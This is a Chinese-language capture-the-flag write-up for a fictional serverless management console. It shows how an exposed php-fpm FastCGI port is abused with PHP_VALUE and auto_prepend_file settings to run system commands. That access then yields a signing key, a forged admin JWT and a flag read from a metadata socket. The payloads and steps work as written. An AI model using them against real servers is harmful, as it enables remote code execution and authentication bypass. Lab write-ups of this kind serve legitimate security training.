## 题目原文

> 这是一套企业级 Serverless 云函数管理控制台。平台最近刚完成一次认证网关和运行时链路迁移。静态资源服务、登录流程与管理员规则引擎看起来都很正常，但实现细节里可能藏着问题。请尝试获取 flag，并关注运行时限制里哪些能力实际上仍然可用。

## 题解

### 入口与指纹

`nginx/1.10.3` + `PHP/5.6.40`，登录页是 CloudFunc Serverless Platform。登录**任意用户名 + 任意密码**都会 302 到 `/control.php`，身份为 `developer`。

控制台提示：

```
您的账号类型为 developer，暂无调试权限。
当前功能仅对管理员账号开放。
```

### 关键观察

**1. 身份是签名的 JWT，`kid` 指向服务端密钥文件。**

登录后 Cookie 里有两项：

```
user_email=dev
token=eyJraWQiOiJwcm9kLmtleSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0...
```

header 是 `{"kid":"prod.key","typ":"JWT","alg":"HS256"}`，payload 是 `{"email":"dev","role":"developer","exp":...}`。`/vendor/composer/installed.json` 可直读，确认用的是 `firebase/php-jwt v5.2.0`。

**2. 源目录 `/keys/` 被 nginx 403，但文件本身对 php-fpm 可读。**

```
/keys/prod.key      → 403（nginx deny）
```

**3. 9000 端口对 VPN 开放，是 php-fpm 的 FastCGI，不是 HTTP。**

```
curl http://T:9000/     → Connection reset by peer
```

这代表可以绕过 nginx，直接用 FastCGI 协议指定 `SCRIPT_FILENAME` 执行任意 PHP。

**4. 拿到密钥后可以伪造 admin JWT；而 flag 不在文件里，在本地 metadata agent 的 unix socket 上。**

`/hint.txt`（通过 php-fpm 读到）：

```
The flag is served by the local metadata agent, not by a world-readable file.
Try querying it from inside the container runtime:
curl --unix-socket /run/cloudfunc/metadata.sock http://localhost/latest/flag
```

`/challenge/flag.txt` 是 `-r-------- root root`，`www-data` 读不到，所以必须走 socket。

### 利用链

**Step 1：确认 9000 是 FastCGI。**

HTTP 请求被 reset，说明它不是 HTTP 服务；结合 `php-fpm` 的默认端口，直接构造 FastCGI 请求。

**Step 2：用 FastCGI 执行 PHP（绕过 nginx）。**

最小客户端（Python）发 `BEGIN_REQUEST` + `PARAMS` + `STDIN`：

```python
params = {
  'REQUEST_METHOD':'POST',
  'SCRIPT_FILENAME':'/var/www/html/index.php',
  'SCRIPT_NAME':'/index.php',
  'CONTENT_LENGTH':str(len(payload)),
  'PHP_VALUE':'allow_url_include=On\nauto_prepend_file=php://input',
  'PHP_ADMIN_VALUE':'allow_url_include=On\nauto_prepend_file=php://input',
}
body = '<?php system("id"); ?>'
```

返回：

```
X-Powered-By: PHP/5.6.40
PWN:uid=33(www-data) gid=33(www-data)
```

直接 RCE（www-data）。

**Step 3：读被 nginx 403 的私钥。**

```php
file_get_contents('/var/www/html/keys/prod.key')
→ cloudfunc_prod_2026_hmac_key_keep_internal\n
```

注意 **key 末尾有换行**，签名时必须带上（`prod.key` 43 字节、字符串 42 字符）。

**Step 4：伪造 admin JWT。**

```python
key = b'cloudfunc_prod_2026_hmac_key_keep_internal\n'
header  = {"kid":"prod.key","typ":"JWT","alg":"HS256"}
payload = {"email":"admin","role":"admin","exp": now+7200}
token = HS256(header, payload, key)
```

带上 `Cookie: token=<forged>; user_email=admin` 访问 `/control.php`：

```
CloudFunc 触发器控制台
单行触发器执行器已启用
1,234 总调用次数 | 56 活跃函数 | 98.5% 可用性
```

**Step 5：读 metadata socket。**

`/hint.txt` 给出的路径是 `unix:///run/cloudfunc/metadata.sock`，HTTP 请求 `/latest/flag`：

```php
$s = stream_socket_client("unix:///run/cloudfunc/metadata.sock", $e, $m, 5);
fwrite($s, "GET /latest/flag HTTP/1.0\r\nHost: localhost\r\n\r\n");
echo stream_get_contents($s);
```

返回：

```
HTTP/1.1 200 OK
Server: CloudFuncMetadata/1.0 Python/3.5.3
Content-Type: text/plain; charset=utf-8
Content-Length: 42

flag{41215050-6171-49da-b48f-fc29547794de}
```

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `/run/cloudfunc/metadata.sock` 的 `/latest/flag`，经 php-fpm RCE 后读取 |

### 复盘

- **HTTP 连接被 reset 的端口不一定是「关着的」。** 9000 是 php-fpm，需要说 FastCGI 而不是 HTTP；`Connection reset` 往往意味着协议不对，而不是服务不在。
- **nginx 403 只挡了 Web 层。** `/keys/` 对 HTTP 403，但文件对 php-fpm 完全可读——拿到任意 PHP 执行后，Web 层的访问控制不再有意义。
- **密钥文件要按字节读。** `prod.key` 末尾有换行，少了它签名永远不过；`wc -c` 和字符串长度不一致就是线索。
- **JWT 的 `kid` 是线索不是漏洞本身。** 本题真正的弱点是私钥文件可读 + php-fpm 暴露；kid 只是告诉你用哪个密钥。
- **flag 不一定在文件系统里。** `/hint.txt` 明确说 flag 由本地 metadata agent 提供，`/challenge/flag.txt` 是 root-only 的诱饵。
- **管理面板里的「研发备忘录」是在提示另一个 Bug**（`php_code.execute` 字段点号被 PHP 转成下划线），但本次用不到——已经在 www-data 上有任意 PHP 执行了。
